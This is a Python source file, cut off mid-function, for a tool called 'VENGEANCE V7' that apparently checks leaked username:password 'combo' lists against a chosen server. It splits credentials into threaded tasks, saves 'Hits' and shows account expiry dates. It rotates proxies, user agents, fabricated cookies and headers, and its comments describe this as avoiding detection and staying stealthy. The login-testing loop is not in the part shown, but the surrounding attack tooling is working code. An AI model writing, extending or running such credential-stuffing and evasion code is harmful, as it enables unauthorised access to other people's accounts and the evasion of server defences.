
import os
import sys
import time
import datetime
import threading
import queue
import re
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
try:
    import requests
except ImportError:
    requests = None
if requests is None:
    print("[ERROR] 'requests' is required. Install it then relaunch.")
    sys.exit(1)
# === Sauvegarde/Reprise ===
_SAVE_AND_EXIT = threading.Event()
_STATE_LOCK = threading.Lock()
# ==== STOP/THREADS HELPERS ====
# ——— à mettre en haut du fichier (près des autres globals) ———
_SERVER_STATUS = {"text": "—", "ts": 0}  # mis à jour après ask_servers()

_STOP_ALL = threading.Event()
_DASH_STOP = threading.Event()

_ALL_THREADS = set()
_THREADS_LOCK = threading.Lock()
# === PROXY POOL (global & thread-safe)
PROXY_POOL = []
PROXY_LOCK = threading.Lock()

PROXY_DISPLAY = True

# ==== Live proxy-file watcher (no-filter mode) ====
PROXY_FILE_WATCH = {"path": None, "known": set(), "running": False}
PROXY_FILE_STATS = {"file": "", "lines": 0, "loaded": 0, "last_add_ts": 0}

def get_proxy_file_stats():
    """Snapshot thread-safe pour le dashboard."""
    with PROXY_LOCK:
        return dict(PROXY_FILE_STATS)
        
# -- Proxy log controls (mute after the first valid) --
PROXY_MUTE = threading.Event()         # coupe tous les logs proxy quand set()
FIRST_PROXY_PRINTED = threading.Event()# assure qu'une seule ligne [PROXY] s'affiche

def _proxy_log_once(msg: str):
    """Affiche une seule fois (pour le 1er proxy valide), puis silence."""
    if PROXY_MUTE.is_set():
        return
    # impression atomique une seule fois
    if not FIRST_PROXY_PRINTED.is_set():
        print(msg)
        FIRST_PROXY_PRINTED.set()
        
def set_proxy_pool(proxies_list):
    global PROXY_POOL
    with PROXY_LOCK:
        PROXY_POOL = list(proxies_list or [])
    # Optionnel: si une session existe dans ce thread, applique un proxy tout de suite
    s = getattr(_thread_local, "s", None)
    if s is not None:
        s.proxies = _get_random_proxy()  # défini plus bas
        
def spawn_thread(target, name=None, daemon=True, **kwargs):
    """Crée un thread, l’enregistre (pour join global), et le démarre."""
    t = threading.Thread(target=target, name=name, kwargs=kwargs, daemon=daemon)
    with _THREADS_LOCK:
        _ALL_THREADS.add(t)
    t.start()
    return t

def _interruptible_sleep(total_sec, quantum=0.05):
    """Sommeil fractionné, interruptible, sans sleep négatif (monotonic)."""
    try:
        total = float(total_sec)
    except Exception:
        return
    if total <= 0:
        return
    deadline = time.monotonic() + total
    q = max(0.01, float(quantum))  # garde-fou
    while not _STOP_ALL.is_set():
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        time.sleep(q if remaining > q else remaining)

def request_stop(save=False, join_timeout=10.0):
    """
    Arrêt unique et instantané : pose des flags, réveille les waits,
    ferme les sessions, purge les queues via les workers, et join les threads connus.
    """
    if save:
        _SAVE_AND_EXIT.set()
    _STOP_ALL.set()
    _DASH_STOP.set()

    # Réveiller les wait() du round-robin / superviseur
    try:
        cancel_all_turns()
    except Exception:
        pass

    # Fermer toutes les sessions HTTP actives (évite les sockets pendantes)
    try:
        _close_all_sessions()
    except Exception:
        pass

    # Joindre proprement tous les threads spawn_thread()
    deadline = time.monotonic() + float(join_timeout)
    with _THREADS_LOCK:
        for th in list(_ALL_THREADS):
            if th is threading.current_thread():
                continue  # anti self-join
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            try:
                th.join(timeout=max(0.05, remaining))
            except Exception:
                pass        
# Garde-fous encodages (placer près des imports)
try:
    import brotli as _br
    _HAS_BR = True
except Exception:
    _HAS_BR = False

try:
    import zstandard as _zstd
    _HAS_ZSTD = True
except Exception:
    _HAS_ZSTD = False

def _pick_accept_encoding():
    """Choisit 'Accept-Encoding' plausible selon les libs réellement installées."""
    opts = ['gzip, deflate']
    if _HAS_BR:
        opts.append('gzip, deflate, br')
    if _HAS_ZSTD:
        opts.append('gzip, deflate, zstd')
    if _HAS_BR and _HAS_ZSTD:
        opts.append('gzip, deflate, br, zstd')
    return random.choice(opts)

def _get_adaptive_timeouts(using_proxy=False):
    if using_proxy:
        # Plus longs avec proxy pour être furtif
        connect_timeout = random.uniform(3.0, 6.0)    # 3-6 secondes
        read_timeout = random.uniform(15.0, 30.0)     # 15-30 secondes
    else:
        # Plus courts en direct pour la vitesse
        connect_timeout = random.uniform(1.5, 3.0)    # 1.5-3 secondes  
        read_timeout = random.uniform(8.0, 15.0)      # 8-15 secondes
    return (connect_timeout, read_timeout)
        
def _resolve_out_dir():
    """
    Renvoie le dossier 'Hits/VΞNGΞANCΞ' à utiliser pour la sauvegarde.
    - Si OUT_DIR est déjà défini ailleurs, on le réutilise.
    - Sinon, on crée /sdcard/Hits/VΞNGΞANCΞ (Android) ou un dossier local.
    """
    # 1) Si OUT_DIR existe déjà dans le script, on l'utilise
    try:
        d = OUT_DIR  # défini plus bas dans certains scripts
        if isinstance(d, str) and d:
            os.makedirs(d, exist_ok=True)
            return d
    except NameError:
        pass

    # 2) Tentative Android (/sdcard ou /storage/emulated/0)
    base = '/sdcard' if os.path.isdir('/sdcard') else '/storage/emulated/0'
    d = os.path.join(base, 'Hits', 'VΞNGΞANCΞ')
    try:
        os.makedirs(d, exist_ok=True)
        return d
    except Exception:
        # 3) Fallback dossier local
        d = os.path.join(os.getcwd(), 'VΞNGΞANCΞ')
        os.makedirs(d, exist_ok=True)
        return d

# Fichier de sauvegarde (ne plante pas si OUT_DIR n'est pas encore défini)
SAVE_FILE = os.path.join(_resolve_out_dir(), 'sauvegarde.json')

# Contexte d'exécution courant (rempli au démarrage de l'analyse)
_RUN_CTX = {
    "servers": [],
    "combo_name": "",
    # Toutes les tâches théoriques par partie: liste de [server, user, pwd]
    "parts_all_tasks": {1: [], 2: [], 3: []},
    # Tâches déjà traitées par partie (clé identique): set de tuples (server, user, pwd)
    "parts_done": {1: set(), 2: set(), 3: set()},
}

def _task_key(server, item):
    """Représentation unique et sérialisable d'une tâche -> [server, user, pwd]."""
    user, pwd = item
    return [server, user, pwd]

def _task_tuple(task_key):
    """Inverse de _task_key : [server,user,pwd] -> (server, (user, pwd))."""
    server, user, pwd = task_key
    return server, (user, pwd)

# Stabilise le rendu (pour éviter les restes d'un frame plus long)
_LAST_FRAME_LINES = 0
# === Sauvegarde/Reprise ===
_N_PARTS = 3
_TURN = 1
_TURN_LOCK = threading.Condition()
_PART_DONE = {1: False, 2: False, 3: False}

def init_turn_scheduler(n_parts=3, start=1):
    global _N_PARTS, _TURN, _TURN_LOCK, _PART_DONE
    _N_PARTS = int(n_parts)
    _TURN = int(start)
    _TURN_LOCK = threading.Condition()
    _PART_DONE = {i: False for i in range(1, _N_PARTS + 1)}

def _advance_turn_locked():
    """Passe au prochain tour vers une partie non terminée."""
    global _TURN
    for _ in range(_N_PARTS):
        _TURN = (_TURN % _N_PARTS) + 1
        if not _PART_DONE.get(_TURN, False):
            break
    _TURN_LOCK.notify_all()

def mark_part_done(part_idx):
    """Signale qu'une partie est finie (plus de tâches/threads)."""
    with _TURN_LOCK:
        _PART_DONE[part_idx] = True
        if _TURN == part_idx:
            _advance_turn_locked()

def wait_my_turn(part_idx):
    """Bloque jusqu'au tour de cette partie (ou stop global)."""
    with _TURN_LOCK:
        while True:
            if _STOP_ALL.is_set():
                return False
            if _PART_DONE.get(part_idx, False):
                return False
            if _TURN == part_idx:
                return True
            _TURN_LOCK.wait(timeout=0.05)

def release_turn():
    """Libère le tour pour la partie suivante."""
    with _TURN_LOCK:
        _advance_turn_locked()

def cancel_all_turns():
    """Réveille tout le monde en cas d'arrêt global."""
    with _TURN_LOCK:
        _TURN_LOCK.notify_all()

def _mark_hit_saved(part_idx, n=1):
    """Incrémente en thread-safe le compteur 'saved' de la partie."""
    try:
        P = _PARTS[part_idx - 1]
        with P["lock"]:
            P["stats"]["saved"] = P["stats"].get("saved", 0) + int(n)
    except Exception:
        pass        
# =================== UTILS ===================
# Après les autres imports et variables globales
_ACTIVE_SESSIONS = set()
_SESSIONS_LOCK = threading.Lock()

def _register_session(session):
    """Enregistre une session pour pouvoir la fermer plus tard"""
    with _SESSIONS_LOCK:
        _ACTIVE_SESSIONS.add(session)

def _close_all_sessions():
    """Ferme toutes les sessions HTTP actives - appelé quand F est pressé"""
    with _SESSIONS_LOCK:
        for session in _ACTIVE_SESSIONS:
            try:
                session.close()
            except Exception:
                pass
        _ACTIVE_SESSIONS.clear()
        
def _bar(p, L=36):
    p = 0.0 if not p else max(0.0, min(1.0, float(p)))
    n = int(L * p)
    return '█' * n + '░' * (L - n)

def _strip_scheme(host: str) -> str:
    return host.replace('http://', '').replace('https://', '').replace('/', '').strip()

def _format_ts(ts):
    if not ts:
        return '---'
    try:
        ts = int(float(ts))
        if ts < 10000000:
            return str(ts)
        return datetime.datetime.fromtimestamp(ts).strftime('%d/%m/%Y %H:%M:%S')
    except:
        return str(ts)

def _days_left(exp_ts):
    if not exp_ts:
        return '—'
    try:
        ts = int(float(exp_ts))
        if ts < 10000000:
            return '—'
        d = int(max(0, (ts - time.time()) / 86400))
        return str(d)
    except:
        return '—'

def _split_into_parts(items, parts=3):
    """Coupe `items` en `parts` morceaux équilibrés."""
    n = len(items)
    if n == 0:
        return [[] for _ in range(parts)]
    base = n // parts
    rem = n % parts
    out = []
    start = 0
    for i in range(parts):
        extra = 1 if i < rem else 0
        end = start + base + extra
        out.append(items[start:end])
        start = end
    return out

# =================== USER AGENTS & COOKIES ===================

# ---------------------------
# USER AGENTS (liste étendue ~60)
# ---------------------------
USER_AGENTS = [
    # Mobile Android (modernes)
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",

    # Mobile iOS (iPhone / iPad)
    "Mozilla/5.0 (iPhone15,3; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone14,2; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/123.0.2420.81 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone13,4; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1",

    # Desktop Chrome / Edge (Windows)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",

    # Desktop Mac Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",

    # Linux desktops
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",

    # Older but plausible variants (mix)
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone12,1; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",

    # Edge / Chromium variants
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",

    # Android browser OEM variants
    "Mozilla/5.0 (Linux; Android 12; SM-M127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; ONEPLUS A6010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",

    # Extra Mobile variations
    "Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",

    # Firefox Mobile
    "Mozilla/5.0 (Android 13; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",

    # Smart TV / other reasonable UA (use sparingly)
    "Mozilla/5.0 (Linux; U; Android 9; en-us; SHIELD Android TV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Safari/537.36",

    # A few extra desktop variants for diversity
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",

    # Keep some older-but-plausible mobile entries
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; SM-J700M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0 Mobile Safari/537.36",

    # Final padding variants for volume (~60 entries)
    "Mozilla/5.0 (Linux; Android 14; SM-S916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,7; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0"
]

# ---------------------------
# Construire dynamiquement les familles (fallback automatique)
# ---------------------------
def _build_browser_families(uas):
    families = {'chrome': [], 'firefox': [], 'safari': [], 'edge': []}
    for ua in uas:
        if 'Edg' in ua or 'Edge' in ua:
            families['edge'].append(ua)
        elif 'Firefox' in ua and 'Mobile' not in ua:
            families['firefox'].append(ua)
        elif 'Chrome' in ua and 'Safari' in ua and 'Edg' not in ua:
            families['chrome'].append(ua)
        elif 'Safari' in ua and 'Chrome' not in ua:
            families['safari'].append(ua)
        else:
            # heuristique: put in chrome bucket as safe default
            families['chrome'].append(ua)
    return families

BROWSER_FAMILIES = _build_browser_families(USER_AGENTS)

# Cookies réalistes pour simuler un navigateur
def _get_cookies_for_request():
    """Génère des cookies réalistes avec variations avancées"""
    base_cookies = {
        'session': f"sess_{random.randint(100000, 999999)}",
        'user_token': f"tok_{random.randint(1000000000, 9999999999)}",
        'lang': random.choice(['fr', 'en', 'pt', 'es']),
        'theme': random.choice(['dark', 'light', 'auto']),
        'consent': random.choice(['true', 'false', '1', '0']),
        'timezone': random.choice(['Europe/Paris', 'America/Sao_Paulo', 'UTC', 'Europe/Lisbon']),
    }
    
    # Cookies optionnels pour plus de réalisme
    if random.random() > 0.3:
        base_cookies['pref_lang'] = random.choice(['en', 'pt', 'es', 'fr'])
    if random.random() > 0.5:
        base_cookies['resolution'] = f"{random.choice([1920, 1366, 1536, 1440])}x{random.choice([1080, 768, 864, 900])}"
    if random.random() > 0.7:
        base_cookies['visited'] = str(int(time.time()) - random.randint(0, 86400))
    
    return base_cookies

def _adaptive_rotation_control(session):
    """Contrôle adaptatif de la rotation basé sur les performances"""
    if not hasattr(session, 'metrics'):
        return
        
    total = session.metrics['total_requests']
    failed = session.metrics['failed_requests']
    
    if total > 20:  # Seulement après un échantillon significatif
        failure_rate = failed / total
        
        # Ajustements dynamiques
        if failure_rate > 0.4:
            # Augmenter l'agressivité des rotations
            session.ua_rotate_every = max(15, int(session.ua_rotate_every * 0.7))
            session.cookie_rotate_every = max(10, int(session.cookie_rotate_every * 0.7))
        elif failure_rate < 0.1:
            # Réduire les rotations si tout va bien
            session.ua_rotate_every = min(100, int(session.ua_rotate_every * 1.3))
            session.cookie_rotate_every = min(60, int(session.cookie_rotate_every * 1.3))

def _vary_headers(session):
    """
    Variation mineure des headers pour éviter la détection.
    Utilise _pick_accept_encoding() pour rester compatible avec les encodages installés.
    """
    variations = {
        'Accept-Encoding': _pick_accept_encoding(),  # ← encodage dynamique (br/zstd seulement si dispo)
        'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
        'Accept': random.choice([
            'application/json,text/plain,*/*',
            'application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        ])
    }
    session.headers.update(variations)

def _response_hook(response, *args, **kwargs):
    """Hook pour analyser les réponses et ajuster le comportement"""
    s = getattr(_thread_local, "s", None)
    if s and hasattr(s, 'metrics'):
        s.metrics['total_requests'] += 1
        if not response.ok:
            s.metrics['failed_requests'] += 1
            
        # Ajustement dynamique basé sur le taux d'échec
        failure_rate = s.metrics['failed_requests'] / max(1, s.metrics['total_requests'])
        if failure_rate > 0.3:  # Si plus de 30% d'échec
            s.ua_rotate_every = max(10, s.ua_rotate_every - 5)  # Rotation plus fréquente
    
# PATHS / GLOBALS
BASE_DIR = '/sdcard' if os.path.isdir('/sdcard') else '/storage/emulated/0'
COMBO_DIR = os.path.join(BASE_DIR, 'combo')
OUT_DIR = os.path.join(BASE_DIR, 'Hits', 'VΞNGΞANCΞ')   # saved to /sdcard/Hits/VENGEANCE
os.makedirs(COMBO_DIR, exist_ok=True)
os.makedirs(OUT_DIR, exist_ok=True)

_display_lock = threading.Lock()
_start = time.time()

# État partagé des 3 parties pour le tableau de bord
# Chaque entrée: {"name": str, "combo": str, "stats": dict, "total": int, "server_hits": dict, "lock": Lock}
_PARTS = [None, None, None]

# --- Dashboard loop (évite la contention d'UI) ---

def dashboard_loop(period=0.25):
    """Rafraîchit l'UI sans bloquer et s'arrête instantanément sur F/S."""
    if not period or period <= 0:
        period = 0.25
    while not _DASH_STOP.is_set() and not _STOP_ALL.is_set():
        try:
            render_dashboard()
        except Exception:
            pass
        _interruptible_sleep(period)
        
def _keyboard_listener():
    """
    Listener non-bloquant pour Android/Termux/QPython (POSIX via termios+tty+select)
    et fallback Windows (via msvcrt).

    - [F] : arrêt immédiat
    - [S] : sauvegarde + arrêt immédiat
    """
    def _trigger_stop(save=False):
        # ✅ on utilise désormais la fonction centrale request_stop()
        request_stop(save=save, join_timeout=10.0)

    try:
        import termios, tty, select
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setcbreak(fd)
            while not _STOP_ALL.is_set():
                # Lecture non bloquante
                r, _, _ = select.select([sys.stdin], [], [], 0.1)
                if not r:
                    continue
                ch = sys.stdin.read(1)
                if not ch:
                    continue
                low = ch.lower()

                if low == 'f':  # F → arrêt immédiat
                    _trigger_stop(save=False)
                    break
                if low == 's':  # S → sauvegarde + arrêt
                    _trigger_stop(save=True)
                    break

        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)

    except Exception:
        # 💻 Fallback Windows
        try:
            import msvcrt
            while not _STOP_ALL.is_set():
                if msvcrt.kbhit():
                    ch = msvcrt.getwch()
                    if not ch:
                        continue
                    low = ch.lower()
                    if low == 'f':
                        _trigger_stop(save=False)
                        break
                    if low == 's':
                        _trigger_stop(save=True)
                        break
                _interruptible_sleep(0.05)
        except Exception:
            pass
             
 # ==== SPINNER CIRCLES RAINBOW (reload, non-bloquant) ====
_SPINNER = {"t": 0}

_RAINBOW = [
    196,202,208,214,220,226,190,154,118,82,46,47,48,49,50,51,
    45,39,33,27,21,57,93,129,165,201
]

def _fg256(c): return f"\x1b[38;5;{c}m"
RESET = "\x1b[0m"
GRAY  = "\x1b[90m"

def spinner_circles_rainbow(width=18, filled="●", empty="○", head="●"):
    """
    Barre 'ronds' qui progresse à chaque appel :
      - ronds '●' colorés (remplis) + '○' gris (vides)
      - la tête avance, couleurs arc-en-ciel défilent, puis reload
    """
    t = _SPINNER["t"]; _SPINNER["t"] = t + 1
    pos = t % (width + 3)  # petite respiration en fin

    # Phase de respiration: tout vide + tête clignotante au début
    if pos >= width:
        blink = ((pos - width) % 2) == 0
        head_col = _fg256(_RAINBOW[(t // 2) % len(_RAINBOW)])
        first = (head_col + head + RESET) if blink else (GRAY + empty + RESET)
        return first + (GRAY + empty + RESET) * (width - 1)

    out = []
    for i in range(width):
        col = _RAINBOW[(i + t) % len(_RAINBOW)]
        if i < pos:          # rempli
            out.append(_fg256(col) + filled + RESET)
        elif i == pos:       # tête
            out.append(_fg256(col) + head + RESET)
        else:                # vide
            out.append(GRAY + empty + RESET)
    return "".join(out)

import json

def save_state():
    """Sauvegarde les tâches restantes (non traitées) par partie dans SAVE_FILE."""
    try:
        with _STATE_LOCK:
            state = {
                "servers": _RUN_CTX["servers"],
                "combo_name": _RUN_CTX["combo_name"],
                "parts": {
                    # on sauvegarde UNIQUEMENT les tâches RESTANTES
                    str(p): [
                        task for task in _RUN_CTX["parts_all_tasks"][p]
                        if tuple(task) not in _RUN_CTX["parts_done"][p]
                    ]
                    for p in (1, 2, 3)
                },
                "ts": int(time.time())
            }
            tmp = SAVE_FILE + ".tmp"
            os.makedirs(os.path.dirname(SAVE_FILE), exist_ok=True)
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(state, f, ensure_ascii=False, indent=2)
            os.replace(tmp, SAVE_FILE)
        return True
    except Exception as e:
        try:
            # fallback minimal si pb
            with open(SAVE_FILE, "w", encoding="utf-8") as f:
                f.write("{}")
        except Exception:
            pass
        return False

def load_state():
    """Charge l'état si disponible. Retourne dict ou None."""
    try:
        if not os.path.isfile(SAVE_FILE):
            return None
        with open(SAVE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        # validation minimale
        if not data or "servers" not in data or "parts" not in data:
            return None
        return data
    except Exception:
        return None

def clear_state():
    try:
        if os.path.isfile(SAVE_FILE):
            os.remove(SAVE_FILE)
    except Exception:
        pass               
# =================== I/O ===================

def _type_appear_centered(text, color="\x1b[1;31m", delay=0.05):
    """Affiche `text` au centre, lettre par lettre, avec arrêt instantané F/S."""
    import shutil
    term_w = shutil.get_terminal_size((80, 20)).columns
    raw = _strip_ansi(text)
    cur = ""

    for ch in raw:
        # ✅ arrêt immédiat si F ou S est pressé
        if _STOP_ALL.is_set():
            break

        cur += ch
        pad = max(0, (term_w - len(cur)) // 2)
        sys.stdout.write("\r" + " " * pad + f"{color}{cur}\x1b[0m")
        sys.stdout.flush()

        # Pause animée, mais interruptible
        _interruptible_sleep(delay)

        if _STOP_ALL.is_set():
            break

    sys.stdout.write("\n")
    sys.stdout.flush()


def ask_servers(show_title=True):
    import shutil
    term_w = shutil.get_terminal_size((80, 20)).columns

    # Colors
    RED   = "\x1b[1;31m"
    GRAY  = "\x1b[0;90m"
    GOLD  = "\x1b[1;33m"
    CYAN  = "\x1b[1;36m"
    GREEN = "\x1b[1;32m"
    YELLOW = "\x1b[1;33m"
    BLUE  = "\x1b[1;34m"
    RESET = "\x1b[0m"

    title = "V E N G E A N C E V7"
    underline = "─" * len(title)

    # --- Title animation (optional) ---
    if show_title:
        _type_appear_centered(title, color=RED, delay=0.05)
        pad = max(0, (term_w - len(underline)) // 2)
        print(" " * pad + f"{RED}{underline}{RESET}")

    # Intro text (centered)
    if show_title:
        block = [
            "",
            f"{GRAY}Single server scan mode — enter host or host:port (http://example.com or 1.2.3.4:8080){RESET}",
            f"{GRAY}Leave blank and press Enter to cancel.{RESET}",
            ""
        ]
        for line in block:
            pad = max(0, (term_w - len(_strip_ansi(line))) // 2)
            print(" " * pad + line)

    # Prompt
    try:
        s = input(f"{GOLD}Server ➤ {CYAN}").strip()
    except (KeyboardInterrupt, EOFError):
        print(RESET)
        return []

    print(RESET, end='')

    if not s:
        return []

    # Confirmation (centered)
    clean = _strip_scheme(s)
    conf = f"{GREEN}Scanning →{RESET} {CYAN}{clean}{RESET}"
    pad = max(0, (term_w - len(_strip_ansi(conf))) // 2)
    print("\n" + " " * pad + conf + "\n")

    # 🟢 Test du statut serveur (et affichage juste en dessous)
    try:
        status = check_server_status(clean)
        code = status.get("code", "—")
        latency = status.get("latency", "—")

        # Couleur selon statut principal
        if status["status"] == "online":
            color = GREEN
        elif status["status"] == "protected":
            color = YELLOW
        elif status["status"] in ("redirect", "client_error"):
            color = BLUE
        elif status["status"] == "server_error":
            color = RED
        else:
            color = GRAY

        # Couleur du temps de réponse
        if latency == "—" or latency is None:
            latency_color = GRAY + "—" + RESET
        elif latency < 150:
            latency_color = f"{GREEN}{latency} ms{RESET}"
        elif latency < 400:
            latency_color = f"{YELLOW}{latency} ms{RESET}"
        else:
            latency_color = f"{RED}{latency} ms{RESET}"

        # Ligne affichée centrée
        status_text = f"{color}{status['status'].upper()}{RESET} ({code}, {latency_color})"
        pad = max(0, (term_w - len(_strip_ansi(status_text))) // 2)
        print(" " * pad + status_text + "\n")

        # 🔸 Alimente le dashboard (ligne "Status" sous "Server")
        try:
            G = globals()
            G.setdefault("_SERVER_STATUS", {})
            G["_SERVER_STATUS"]["text"] = status_text
            G["_SERVER_STATUS"]["ts"] = int(time.time())
        except Exception:
            pass

    except Exception:
        pad = max(0, (term_w - 20) // 2)
        offline_text = f"{RED}OFFLINE{RESET} (—, {GRAY}—{RESET})"
        print(" " * pad + offline_text + "\n")
        # 🔸 Enregistre aussi OFFLINE pour le dashboard
        try:
            G = globals()
            G.setdefault("_SERVER_STATUS", {})
            G["_SERVER_STATUS"]["text"] = offline_text
            G["_SERVER_STATUS"]["ts"] = int(time.time())
        except Exception:
            pass

    return [clean]


# helper pour compter sans ANSI
import re
_ansi_re = re.compile(r'\x1b\[[0-9;]*m')
def _strip_ansi(s: str) -> str:
    return _ansi_re.sub("", s)
    
def choose_combo():
    files = [f for f in os.listdir(COMBO_DIR) if f.lower().endswith('.txt')]
    if not files:
        print(f'\x1b[1;31m[ERROR]\x1b[0m \x1b[0;33mNo .txt combos found in {COMBO_DIR}\x1b[0m')
        sys.exit(1)
    print('\x1b[0;90mSelect a combo file:\x1b[0m')
    for i, name in enumerate(files, 1):
